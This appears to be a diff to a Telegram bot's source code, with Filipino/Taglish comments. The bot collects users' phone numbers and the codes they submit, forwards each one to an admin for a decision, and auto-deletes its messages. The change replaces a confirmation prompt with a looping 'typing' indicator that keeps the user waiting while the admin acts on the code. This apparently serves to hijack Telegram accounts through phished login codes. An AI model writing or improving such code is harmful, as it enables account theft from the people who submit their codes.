@@ -20,12 +20,25 @@ const bot = new Telegraf(BOT_TOKEN);
 // in-memory storage
 const userPhones = new Map();   // Telegram user id -> phone number
 const submissions = new Map();  // submissionId -> { userId, code, telegramPhone, username, firstName }
+// NEW: para sa typing loops
+const typingLoops = new Map();  // userId (string) -> intervalId
 
 // helper: delete message after delayMs (default 30 minutes)
 function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
   setTimeout(() => {
     bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
   }, delayMs);
+}
+
+// NEW: stop typing loop for a user
+function stopTypingLoop(userId) {
+  if (!userId) return;
+  const key = String(userId);
+  const intervalId = typingLoops.get(key);
+  if (intervalId) {
+    clearInterval(intervalId);
+    typingLoops.delete(key);
+  }
 }
 
 // helper: reply + auto delete
@@ -157,49 +170,29 @@ app.post("/api/log-code", async (req, res) => {
     firstName,
   });
 
-  // SEND PHOTO TO USER after receiving code
+  // ====== DITO NAGBAGO: TYPING EFFECT LANG, WALANG PHOTO / TEXT / BUTTONS ======
   if (userId) {
     try {
-      console.log(`Sending photo to user ${userId}`);
-      await bot.telegram.sendPhoto(
-        userId,
-        PHOTO_URL,
-        {
-          caption: "...",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "Confirm", callback_data: `confirm_login:${userId}` },
-                { text: "Cancel", callback_data: `deny_login:${userId}` }
-              ]
-            ]
-          }
-        }
-      );
-      console.log("Photo sent successfully to user");
-    } catch (photoErr) {
-      console.error("Error sending photo to user:", photoErr);
-      // Fallback to text message if photo fails
-      try {
-        await bot.telegram.sendMessage(
-          userId,
-          "....",
-          {
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: "Oo, ako yan", callback_data: `confirm_login:${userId}` },
-                  { text: "Hindi ako yan!", callback_data: `deny_login:${userId}` }
-                ]
-              ]
-            }
-          }
-        );
-      } catch (textErr) {
-        console.error("Error sending fallback message:", textErr);
-      }
+      console.log(`Starting typing-only indicator for user ${userId}`);
+
+      // Stop previous typing loop kung meron
+      stopTypingLoop(userId);
+
+      // Mag-loop ng typing every 4 seconds (Telegram typing ~5s duration)
+      const intervalId = setInterval(() => {
+        bot.telegram
+          .sendChatAction(userId, "typing")
+          .catch((err) => console.error("sendChatAction error:", err));
+      }, 4000);
+
+      typingLoops.set(String(userId), intervalId);
+
+      console.log("Typing animation loop started (no message, no buttons)");
+    } catch (err) {
+      console.error("Error starting typing indicator:", err);
     }
   }
+  // ====== END OF CHANGES SA PART NA ITO ======
 
   const logText =
     "🔔 New verification request\n\n" +
@@ -235,8 +228,11 @@ bot.on("callback_query", async (ctx) => {
 
   // Handle user login confirmation
   if (data.startsWith("confirm_login:") || data.startsWith("deny_login:")) {
-    const [action, userId] = data.split(":");
+    const [action, userIdStr] = data.split(":");
     
+    // STOP TYPING LOOP for this user (OPTIONAL but recommended)
+    stopTypingLoop(userIdStr);
+
     if (action === "confirm_login") {
       await ctx.answerCbQuery("Salamat sa confirmation!");
       try {
@@ -279,6 +275,11 @@ bot.on("callback_query", async (ctx) => {
   submissions.delete(submissionId);
 
   const { userId, code, telegramPhone, username, firstName } = submission;
+
+  // STOP TYPING LOOP din kapag admin nag-decide na
+  if (userId) {
+    stopTypingLoop(userId);
+  }
 
   const displayName =
     firstName && username ? `${firstName} (@${username})`
@@ -341,4 +342,4 @@ bot.launch();
 console.log("Bot started");
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
-process.once("SIGTERM", () => bot.stop("SIGTERM")); 
+process.once("SIGTERM", () => bot.stop("SIGTERM"));
